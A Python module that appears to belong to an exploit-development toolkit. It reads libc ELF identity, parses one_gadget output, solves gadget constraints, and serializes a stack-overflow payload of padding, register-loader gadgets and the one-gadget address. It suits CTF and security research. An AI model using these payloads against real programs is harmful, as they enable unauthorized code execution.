"""Static libc identity and conservative one-gadget constraint planning.

This is intentionally not a one-gadget finder and never executes libc.  It
accepts local ``one_gadget``-style offsets/constraints, proves a supported
subset from caller-supplied state, and serializes only assignments that have
explicit caller-supplied loader gadgets or controlled stack slots.
"""
from __future__ import annotations

from dataclasses import dataclass
import hashlib
from pathlib import Path
import re
import struct
from typing import Iterable, Mapping, Sequence

try:
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
except ImportError:  # pragma: no cover
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes


MAX_LIBC = 128 * 1024 * 1024
MAX_CONSTRAINTS = 256
MAX_STACK_TAIL = 1024 * 1024


@dataclass(frozen=True)
class LibcIdentity:
    sha256: str
    build_id: str
    bits: int
    endian: str
    machine: str
    size: int
    executable_ranges: tuple[tuple[int, int], ...]

    def contains_executable_offset(self, offset: int) -> bool:
        return any(start <= offset < end for start, end in self.executable_ranges)


@dataclass(frozen=True)
class OneGadgetCandidate:
    offset: int
    description: str
    constraints: tuple[str, ...]


@dataclass(frozen=True)
class ConstraintSolution:
    satisfiable: bool
    register_assignments: tuple[tuple[str, int], ...]
    stack_assignments: tuple[tuple[int, int], ...]
    chosen_branches: tuple[str, ...]
    unresolved: tuple[str, ...]
    reasons: tuple[str, ...]


_MACHINES = {3: "i386", 8: "mips", 40: "arm", 62: "amd64", 183: "aarch64", 243: "riscv"}


def _read_source(source: bytes | bytearray | memoryview | str | Path) -> bytes:
    if isinstance(source, (bytes, bytearray, memoryview)):
        data = bytes(source)
    else:
        try:
            with Path(source).open("rb") as handle:
                data = handle.read(MAX_LIBC + 1)
        except OSError as exc:
            raise BuildError(f"cannot read libc source: {exc}") from exc
    if len(data) > MAX_LIBC:
        raise BuildError(f"libc exceeds {MAX_LIBC} bytes")
    return data


def _unpack(fmt: str, data: bytes, offset: int) -> tuple[int, ...]:
    size = struct.calcsize(fmt)
    if offset < 0 or offset + size > len(data):
        raise BuildError("ELF table extends past end of libc")
    return struct.unpack_from(fmt, data, offset)


def identify_libc(source: bytes | bytearray | memoryview | str | Path) -> LibcIdentity:
    """Read ELF identity, GNU build-id, and executable virtual-offset ranges."""

    data = _read_source(source)
    if len(data) < 52 or data[:4] != b"\x7fELF":
        raise BuildError("libc source is not an ELF")
    bits = {1: 32, 2: 64}.get(data[4])
    endian = {1: "little", 2: "big"}.get(data[5])
    if bits is None or endian is None:
        raise BuildError("unsupported libc ELF class or endian")
    ec = "<" if endian == "little" else ">"
    _etype, machine_number = _unpack(ec + "HH", data, 16)
    if bits == 64:
        phoff = _unpack(ec + "Q", data, 32)[0]
        phentsize, phnum = _unpack(ec + "HH", data, 54)
        expected = 56
    else:
        phoff = _unpack(ec + "I", data, 28)[0]
        phentsize, phnum = _unpack(ec + "HH", data, 42)
        expected = 32
    if not phoff or phentsize < expected or not 0 < phnum <= 65535:
        raise BuildError("libc has no bounded program-header table")
    executable: list[tuple[int, int]] = []
    note_regions: list[tuple[int, int]] = []
    for index in range(phnum):
        offset = phoff + index * phentsize
        if bits == 64:
            ptype, flags, file_off, vaddr, _paddr, filesz, _memsz, _align = _unpack(
                ec + "IIQQQQQQ", data, offset
            )
        else:
            ptype, file_off, vaddr, _paddr, filesz, _memsz, flags, _align = _unpack(
                ec + "IIIIIIII", data, offset
            )
        if file_off + filesz > len(data):
            raise BuildError("libc program segment extends past end of file")
        if ptype == 1 and flags & 1 and filesz:  # PT_LOAD, PF_X
            executable.append((vaddr, vaddr + filesz))
        elif ptype == 4 and filesz:  # PT_NOTE
            note_regions.append((file_off, filesz))

    build_ids: set[str] = set()
    for region_offset, region_size in note_regions:
        cursor, end = region_offset, region_offset + region_size
        while cursor + 12 <= end:
            namesz, descsz, note_type = _unpack(ec + "III", data, cursor)
            cursor += 12
            name_end = cursor + namesz
            desc_start = (name_end + 3) & ~3
            desc_end = desc_start + descsz
            if name_end > end or desc_end > end:
                raise BuildError("malformed ELF note in libc")
            name = data[cursor:name_end].rstrip(b"\x00")
            desc = data[desc_start:desc_end]
            if note_type == 3 and name == b"GNU" and desc:
                build_ids.add(desc.hex())
            cursor = (desc_end + 3) & ~3
    if len(build_ids) > 1:
        raise BuildError("libc carries conflicting GNU build-id notes")
    return LibcIdentity(
        hashlib.sha256(data).hexdigest(),
        next(iter(build_ids), ""),
        bits,
        endian,
        _MACHINES.get(machine_number, f"em_{machine_number}"),
        len(data),
        tuple(sorted(set(executable))),
    )


def parse_one_gadget_output(text: str) -> tuple[OneGadgetCandidate, ...]:
    """Parse bounded local ``one_gadget`` text without invoking the tool."""

    if not isinstance(text, str) or len(text) > 4 * 1024 * 1024:
        raise BuildError("one_gadget output must be bounded text")
    candidates: list[OneGadgetCandidate] = []
    current_offset: int | None = None
    description = ""
    constraints: list[str] = []

    def flush() -> None:
        nonlocal current_offset, description, constraints
        if current_offset is not None:
            candidates.append(OneGadgetCandidate(current_offset, description, tuple(constraints)))
        current_offset, description, constraints = None, "", []

    for raw_line in text.splitlines():
        line = raw_line.strip()
        header = re.match(r"^(0x[0-9a-fA-F]+)\s+(.+)$", line)
        if header:
            flush()
            current_offset = int(header.group(1), 16)
            description = header.group(2).strip()
            continue
        if current_offset is None or not line or line.lower() == "constraints:":
            continue
        constraints.append(line.removeprefix("- ").strip())
        if len(constraints) > MAX_CONSTRAINTS:
            raise BuildError("one_gadget constraint count exceeds cap")
    flush()
    return tuple(candidates)


def _number(token: str) -> int:
    token = token.strip().lower()
    if token in {"null", "nil"}:
        return 0
    try:
        value = int(token, 0)
    except ValueError as exc:
        raise BuildError(f"unsupported constraint value: {token}") from exc
    if value < 0:
        raise BuildError("constraint values must be non-negative")
    return value


def _ensure_address_range(start: int, size: int, bits: int, *, name: str) -> None:
    """Reject a serialized payload region that wraps its ELF address space."""

    ensure_uint(start, bits, name=f"{name} start")
    if isinstance(size, bool) or not isinstance(size, int) or size < 0:
        raise BuildError(f"{name} size must be a non-negative integer")
    if size > (1 << bits) - start:
        raise BuildError(f"{name} exceeds the {bits}-bit address space")


def _normalize(constraint: str) -> str:
    value = " ".join(constraint.strip().split())
    while value.startswith("(") and value.endswith(")"):
        value = value[1:-1].strip()
    return value


def _expression_value(expression: str, registers: Mapping[str, int], stack_pointer: int) -> int | None:
    match = re.fullmatch(r"([a-zA-Z][a-zA-Z0-9]*)(?:\s*([+-])\s*(0x[0-9a-fA-F]+|\d+))?", expression.strip())
    if not match:
        return None
    register = match.group(1).lower()
    if register in {"rsp", "esp", "sp"}:
        base = stack_pointer
    elif register in registers:
        base = registers[register]
    else:
        return None
    delta = int(match.group(3), 0) if match.group(3) else 0
    return base - delta if match.group(2) == "-" else base + delta


def solve_one_gadget_constraints(
    constraints: Sequence[str],
    *,
    register_state: Mapping[str, int],
    controllable_registers: Iterable[str] = (),
    stack_pointer: int,
    stack_state: Mapping[int, int] | None = None,
    controllable_stack_offsets: Iterable[int] = (),
    writable_ranges: Sequence[tuple[int, int]] = (),
    facts: Iterable[str] = (),
) -> ConstraintSolution:
    """Conservatively satisfy supported one-gadget constraint clauses."""

    if isinstance(constraints, (str, bytes)) or len(constraints) > MAX_CONSTRAINTS:
        raise BuildError(f"constraints must be a sequence of at most {MAX_CONSTRAINTS} strings")
    registers = {str(key).lower(): int(value) for key, value in register_state.items()}
    controllable_regs = {str(item).lower() for item in controllable_registers}
    stack_values = {int(key): int(value) for key, value in (stack_state or {}).items()}
    controllable_stack = {int(value) for value in controllable_stack_offsets}
    fact_set = {_normalize(str(value)).lower() for value in facts}
    try:
        ranges = tuple((int(start), int(end)) for start, end in writable_ranges)
    except (TypeError, ValueError) as exc:
        raise BuildError("writable ranges must be (start, end) integer pairs") from exc
    if any(start < 0 or end <= start for start, end in ranges):
        raise BuildError("writable ranges must be non-empty increasing intervals")
    register_assignments: dict[str, int] = {}
    stack_assignments: dict[int, int] = {}
    register_requirements: dict[str, int] = {}
    stack_requirements: dict[int, int] = {}
    chosen: list[str] = []
    unresolved: list[str] = []
    reasons: list[str] = []

    def atomic(
        clause: str,
        reg_assign: dict[str, int],
        stk_assign: dict[int, int],
        reg_require: dict[str, int],
        stk_require: dict[int, int],
    ) -> tuple[bool, str]:
        clause = _normalize(clause)
        lower = clause.lower()
        if lower in fact_set:
            return True, "caller fact"

        register_match = re.fullmatch(r"([a-z][a-z0-9]*)\s*==\s*(null|nil|0x[0-9a-f]+|\d+)", lower)
        if register_match:
            register, value = register_match.group(1), _number(register_match.group(2))
            if register in reg_require and reg_require[register] != value:
                return False, (
                    f"conflicting requirement for {register}: "
                    f"{reg_require[register]:#x} versus {value:#x}"
                )
            current = reg_assign.get(register, registers.get(register))
            if current == value:
                reg_require[register] = value
                return True, "known register value"
            if register in controllable_regs:
                reg_assign[register] = value
                reg_require[register] = value
                return True, "controlled register assignment"
            return False, f"{register} is not controllable at required value"

        stack_match = re.fullmatch(
            r"\[(?:rsp|esp|sp)\s*([+-])?\s*(0x[0-9a-f]+|\d+)?\]\s*==\s*"
            r"(null|nil|0x[0-9a-f]+|\d+)", lower
        )
        if stack_match:
            offset = int(stack_match.group(2), 0) if stack_match.group(2) else 0
            if stack_match.group(1) == "-":
                offset = -offset
            value = _number(stack_match.group(3))
            if offset in stk_require and stk_require[offset] != value:
                return False, (
                    f"conflicting requirement for stack offset {offset:+#x}: "
                    f"{stk_require[offset]:#x} versus {value:#x}"
                )
            current = stk_assign.get(offset, stack_values.get(offset))
            if current == value:
                stk_require[offset] = value
                return True, "known stack value"
            if offset in controllable_stack:
                stk_assign[offset] = value
                stk_require[offset] = value
                return True, "controlled stack assignment"
            return False, f"stack offset {offset:+#x} is not controllable"

        align_match = re.fullmatch(
            r"(rsp|esp|sp)\s*&\s*(0x[0-9a-f]+|\d+)\s*==\s*(0x[0-9a-f]+|\d+)", lower
        )
        if align_match:
            mask, expected = int(align_match.group(2), 0), int(align_match.group(3), 0)
            ok = stack_pointer & mask == expected
            return ok, "stack alignment holds" if ok else "stack alignment does not hold"

        writable_match = re.fullmatch(r"(?:address\s+)?(.+?)\s+is\s+writable", lower)
        if writable_match:
            address = _expression_value(writable_match.group(1), {**registers, **reg_assign}, stack_pointer)
            if address is None:
                return False, "writable expression has an unknown base register"
            ok = any(start <= address < end for start, end in ranges)
            return ok, "address is in supplied writable range" if ok else "address is not writable"

        if " is a valid argv" in lower or " is a valid envp" in lower:
            return False, "argv/envp validity needs an exact caller fact"
        return False, "unsupported constraint syntax"

    for raw_constraint in constraints:
        if not isinstance(raw_constraint, str) or not raw_constraint.strip():
            raise BuildError("constraints must be non-empty strings")
        alternatives = [_normalize(part) for part in raw_constraint.split("||")]
        satisfied = False
        branch_reasons: list[str] = []
        for alternative in alternatives:
            reg_trial = dict(register_assignments)
            stack_trial = dict(stack_assignments)
            reg_require_trial = dict(register_requirements)
            stack_require_trial = dict(stack_requirements)
            ok, reason = atomic(
                alternative,
                reg_trial,
                stack_trial,
                reg_require_trial,
                stack_require_trial,
            )
            branch_reasons.append(f"{alternative}: {reason}")
            if ok:
                register_assignments = reg_trial
                stack_assignments = stack_trial
                register_requirements = reg_require_trial
                stack_requirements = stack_require_trial
                chosen.append(alternative)
                satisfied = True
                break
        if not satisfied:
            unresolved.append(raw_constraint)
            reasons.extend(branch_reasons)
    # All clauses are conjunctive: a writable clause proven against an early
    # register value can be invalidated by a later controlled reassignment of
    # that same register, so revalidate every chosen writable clause against the
    # final register state before declaring the conjunction satisfiable.
    if not unresolved:
        final_registers = {**registers, **register_assignments}
        for clause in chosen:
            writable_match = re.fullmatch(
                r"(?:address\s+)?(.+?)\s+is\s+writable", clause.lower()
            )
            if not writable_match:
                continue
            address = _expression_value(
                writable_match.group(1), final_registers, stack_pointer
            )
            if address is None or not any(start <= address < end for start, end in ranges):
                unresolved.append(clause)
                reasons.append(f"{clause}: not writable under final register state")
    return ConstraintSolution(
        not unresolved,
        tuple(sorted(register_assignments.items())),
        tuple(sorted(stack_assignments.items())),
        tuple(chosen), tuple(unresolved), tuple(reasons),
    )


def build_one_gadget_plan(
    libc_source: bytes | bytearray | memoryview | str | Path,
    *,
    libc_base: int,
    gadget_offset: int,
    constraints: Sequence[str],
    register_state: Mapping[str, int],
    stack_pointer: int,
    controllable_registers: Iterable[str] = (),
    register_loaders: Mapping[str, int] | None = None,
    stack_state: Mapping[int, int] | None = None,
    controllable_stack_offsets: Iterable[int] = (),
    writable_ranges: Sequence[tuple[int, int]] = (),
    facts: Iterable[str] = (),
    overflow_offset: int = 0,
    payload_address: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Prove constraints and serialize explicit register/stack assignments."""

    identity = identify_libc(libc_source)
    ensure_uint(libc_base, identity.bits, name="libc_base")
    ensure_uint(gadget_offset, identity.bits, name="gadget_offset")
    ensure_uint(stack_pointer, identity.bits, name="stack_pointer")
    ensure_uint(payload_address, identity.bits, name="payload_address")
    if not identity.contains_executable_offset(gadget_offset):
        raise BuildError("one-gadget offset is not inside an executable libc segment")
    gadget_address = libc_base + gadget_offset
    ensure_uint(gadget_address, identity.bits, name="one_gadget_address")
    if isinstance(overflow_offset, bool) or not isinstance(overflow_offset, int) or not 0 <= overflow_offset <= MAX_STACK_TAIL:
        raise BuildError(f"overflow_offset must be in 0..{MAX_STACK_TAIL}")
    if not isinstance(fill, bytes) or len(fill) != 1:
        raise BuildError("fill must be one byte")
    solution = solve_one_gadget_constraints(
        constraints,
        register_state=register_state,
        controllable_registers=controllable_registers,
        stack_pointer=stack_pointer,
        stack_state=stack_state,
        controllable_stack_offsets=controllable_stack_offsets,
        writable_ranges=writable_ranges,
        facts=facts,
    )
    if not solution.satisfiable:
        raise BuildError("unsatisfied one-gadget constraints: " + "; ".join(solution.reasons))
    loaders = {str(key).lower(): int(value) for key, value in (register_loaders or {}).items()}
    word = identity.bits // 8
    endian = identity.endian
    data = bytearray(fill * overflow_offset)
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    if overflow_offset:
        placements["padding"] = 0
        widths["padding"] = overflow_offset

    def add(label: str, value: int) -> None:
        ensure_uint(value, identity.bits, name=label)
        placements[label] = len(data)
        widths[label] = word
        data.extend(value.to_bytes(word, endian))

    for register, value in solution.register_assignments:
        if register not in loaders:
            raise BuildError(f"constraint assignment for {register} needs a register loader gadget")
        add(f"loader.{register}", loaders[register])
        add(f"assignment.{register}", value)
    add("one_gadget", gadget_address)
    tail_start = len(data)
    actual_stack_pointer = payload_address + tail_start
    ensure_uint(actual_stack_pointer, identity.bits, name="derived stack pointer")
    if actual_stack_pointer != stack_pointer:
        raise BuildError(
            f"rsp_at_gadget mismatch: serialized tail is at {actual_stack_pointer:#x}, "
            f"caller supplied {stack_pointer:#x}"
        )
    stack_assignments = dict(solution.stack_assignments)
    if stack_assignments:
        if min(stack_assignments) < 0:
            raise BuildError("negative controlled stack offsets cannot be serialized after the gadget")
        ordered_offsets = sorted(stack_assignments)
        for left, right in zip(ordered_offsets, ordered_offsets[1:]):
            if right < left + word:
                raise BuildError(
                    f"controlled stack assignment ranges overlap: {left:+#x} and {right:+#x}"
                )
        tail_size = max(stack_assignments) + word
        if tail_size > MAX_STACK_TAIL:
            raise BuildError("controlled stack tail exceeds cap")
        _ensure_address_range(
            payload_address, tail_start + tail_size, identity.bits,
            name="one-gadget payload",
        )
        data += b"\x00" * tail_size
        placements["stack_tail"] = tail_start
        widths["stack_tail"] = tail_size
        for offset, value in stack_assignments.items():
            ensure_uint(value, identity.bits, name=f"stack[{offset:#x}]")
            label = f"stack[{offset:+#x}]"
            placements[label] = tail_start + offset
            widths[label] = word
            data[tail_start + offset:tail_start + offset + word] = value.to_bytes(word, endian)
    raw = bytes(data)
    _ensure_address_range(
        payload_address, len(raw), identity.bits, name="one-gadget payload"
    )
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=identity.machine,
        strategy="one-gadget-constraint-plan",
        base_address=payload_address,
        metadata={
            "libc_sha256": identity.sha256,
            "libc_build_id": identity.build_id,
            "gadget_offset": hex(gadget_offset),
            "rsp_at_gadget": hex(stack_pointer),
            "chosen_constraints": " ; ".join(solution.chosen_branches),
            "register_loader_contract": "each supplied loader pops one following word then returns",
            "delivery": "none",
        },
    )

